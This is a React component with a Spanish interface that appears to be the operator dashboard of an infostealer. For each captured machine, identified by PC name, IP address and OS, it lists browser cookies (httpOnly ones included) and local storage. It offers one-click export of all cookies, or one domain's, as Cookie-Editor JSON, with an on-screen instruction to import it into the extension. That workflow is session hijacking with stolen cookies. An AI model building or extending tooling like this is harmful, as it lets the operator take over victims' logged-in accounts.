'use client';

import React from 'react';
import { X, Search, Copy, Check, ClipboardCopy, Filter } from 'lucide-react';
import { SessionSnapshot, Cookie } from '@/lib/supabase';

interface SessionModalProps {
  session: SessionSnapshot;
  cookies: Cookie[];
  webStorage: any[];
  onClose: () => void;
}

export function SessionModal({ session, cookies, webStorage, onClose }: SessionModalProps) {
  const [copied, setCopied] = React.useState<string | null>(null);
  const [search, setSearch] = React.useState('');
  const [activeTab, setActiveTab] = React.useState<'cookies' | 'storage'>('cookies');
  const [domainFilter, setDomainFilter] = React.useState<string>('all');

  // Get unique domains
  const domains = React.useMemo(() => {
    const d = Array.from(new Set(cookies.map(c => c.domain.replace(/^\./, ''))));
    return d.sort();
  }, [cookies]);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  };

  // Export all cookies (or filtered by domain) as Cookie-Editor JSON format
  const handleCopyCookieEditorJSON = (domainOnly?: string) => {
    const targetCookies = domainOnly
      ? cookies.filter(c => c.domain.includes(domainOnly))
      : cookies;

    const json = targetCookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path || '/',
      secure: c.secure || false,
      httpOnly: c.http_only || false,
      sameSite: c.same_site === 'no_restriction' ? 'no_restriction' : (c.same_site || 'unspecified'),
      expirationDate: c.expiration_date || undefined,
      session: c.is_session || false,
      storeId: c.store_id || '0',
      hostOnly: false,
    }));

    navigator.clipboard.writeText(JSON.stringify(json, null, 2)).then(() => {
      setCopied('cookieeditor-' + (domainOnly || 'all'));
      setTimeout(() => setCopied(null), 3000);
    });
  };

  const filteredCookies = cookies.filter(c => {
    const matchesDomain = domainFilter === 'all' || c.domain.includes(domainFilter);
    const matchesSearch = search === '' ||
      c.domain.toLowerCase().includes(search.toLowerCase()) ||
      c.name.toLowerCase().includes(search.toLowerCase());
    return matchesDomain && matchesSearch;
  });

  const filteredStorage = webStorage.filter(item =>
    search === '' ||
    (item.domain || '').toLowerCase().includes(search.toLowerCase()) ||
    (item.key || '').toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-[#0B0E14] border border-gray-800 rounded-xl w-full max-w-5xl max-h-[92vh] flex flex-col shadow-2xl overflow-hidden">

        {/* Header */}
        <div className="flex justify-between items-center p-5 border-b border-gray-800">
          <div>
            <h2 className="text-lg font-bold text-gray-100">Datos de Sesión</h2>
            <p className="text-xs text-gray-500 mt-0.5">{session.pc_name} · {session.ip_address} · {session.os}</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* === COOKIE-EDITOR EXPORT SECTION === */}
        <div className="p-4 bg-gradient-to-r from-indigo-950/60 to-purple-950/60 border-b border-indigo-800/30">
          <p className="text-xs text-indigo-300 mb-3 flex items-center gap-1.5">
            <ClipboardCopy className="w-3.5 h-3.5" />
            <strong>Importar en Cookie-Editor:</strong> Copia el JSON y pégalo en la extensión → botón Import
          </p>
          <div className="flex flex-wrap gap-2">
            {/* All cookies button */}
            <button
              onClick={() => handleCopyCookieEditorJSON()}
              className="flex items-center gap-2 px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-semibold rounded-lg transition-colors"
            >
              {copied === 'cookieeditor-all'
                ? <><Check className="w-4 h-4 text-green-300" /> ¡Copiado!</>
                : <><Copy className="w-4 h-4" /> Copiar TODAS las Cookies (JSON)</>
              }
            </button>

            {/* Per-domain quick buttons */}
            {domains.slice(0, 5).map(d => (
              <button
                key={d}
                onClick={() => handleCopyCookieEditorJSON(d)}
                className="flex items-center gap-1.5 px-3 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs font-medium rounded-lg transition-colors border border-gray-700"
              >
                {copied === `cookieeditor-${d}`
                  ? <><Check className="w-3 h-3 text-green-400" /> ¡Copiado!</>
                  : <><Filter className="w-3 h-3 text-indigo-400" /> Solo {d}</>
                }
              </button>
            ))}
          </div>
        </div>

        {/* Toolbar */}
        <div className="p-3 border-b border-gray-800 bg-[#0d1117] flex flex-wrap gap-3 items-center">
          <div className="flex gap-1.5">
            <button
              onClick={() => setActiveTab('cookies')}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${activeTab === 'cookies' ? 'bg-indigo-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`}
            >
              Cookies ({cookies.length})
            </button>
            <button
              onClick={() => setActiveTab('storage')}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${activeTab === 'storage' ? 'bg-indigo-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`}
            >
              Local Storage ({webStorage.length})
            </button>
          </div>

          {activeTab === 'cookies' && (
            <select
              value={domainFilter}
              onChange={e => setDomainFilter(e.target.value)}
              className="bg-[#080B10] border border-gray-700 rounded-lg px-3 py-1.5 text-xs text-gray-200 focus:outline-none focus:border-indigo-500"
            >
              <option value="all">Todos los dominios</option>
              {domains.map(d => <option key={d} value={d}>{d}</option>)}
            </select>
          )}

          <div className="relative ml-auto w-full sm:w-56">
            <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
            <input
              type="text"
              placeholder="Buscar..."
              value={search}
              onChange={e => setSearch(e.target.value)}
              className="w-full bg-[#080B10] border border-gray-700 rounded-lg pl-8 pr-3 py-1.5 text-xs text-gray-200 focus:outline-none focus:border-indigo-500"
            />
          </div>
        </div>

        {/* Content */}
        <div className="flex-1 overflow-auto p-4 bg-[#080B10] space-y-3">
          {activeTab === 'cookies' ? (
            filteredCookies.length === 0 ? (
              <div className="text-center py-12 text-gray-500 text-sm">No se encontraron cookies.</div>
            ) : (
              filteredCookies.map(cookie => (
                <div key={cookie.id} className="bg-[#12161F] border border-gray-800 rounded-lg p-3 hover:border-gray-700 transition-colors">
                  <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className="text-indigo-400 font-mono text-xs shrink-0">{cookie.domain}</span>
                      <span className="text-gray-600 text-xs">/</span>
                      <span className="text-gray-200 font-semibold text-sm truncate">{cookie.name}</span>
                    </div>
                    <button
                      onClick={() => handleCopy(cookie.value, cookie.id)}
                      className="text-gray-400 hover:text-white p-1 hover:bg-gray-800 rounded transition-colors flex items-center gap-1 text-xs shrink-0 ml-2"
                    >
                      {copied === cookie.id ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                      {copied === cookie.id ? 'Copiado' : 'Copiar'}
                    </button>
                  </div>
                  <div className="bg-black/50 p-2 rounded border border-gray-800 font-mono text-xs text-gray-400 break-all max-h-16 overflow-hidden hover:max-h-none transition-all">
                    {cookie.value}
                  </div>
                </div>
              ))
            )
          ) : (
            filteredStorage.length === 0 ? (
              <div className="text-center py-12 text-gray-500 text-sm">No hay datos de LocalStorage.</div>
            ) : (
              filteredStorage.map((item, idx) => (
                <div key={idx} className="bg-[#12161F] border border-gray-800 rounded-lg p-3 hover:border-gray-700 transition-colors">
                  <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className="text-purple-400 font-mono text-xs shrink-0">{item.domain || 'N/A'}</span>
                      <span className="text-gray-600 text-xs">/</span>
                      <span className="text-gray-200 font-semibold text-sm truncate">{item.key}</span>
                    </div>
                    <button
                      onClick={() => handleCopy(item.value, `ws-${idx}`)}
                      className="text-gray-400 hover:text-white p-1 hover:bg-gray-800 rounded transition-colors flex items-center gap-1 text-xs shrink-0 ml-2"
                    >
                      {copied === `ws-${idx}` ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                      {copied === `ws-${idx}` ? 'Copiado' : 'Copiar'}
                    </button>
                  </div>
                  <div className="bg-black/50 p-2 rounded border border-gray-800 font-mono text-xs text-gray-400 break-all max-h-16 overflow-hidden">
                    {item.value}
                  </div>
                </div>
              ))
            )
          )}
        </div>
      </div>
    </div>
  );
}
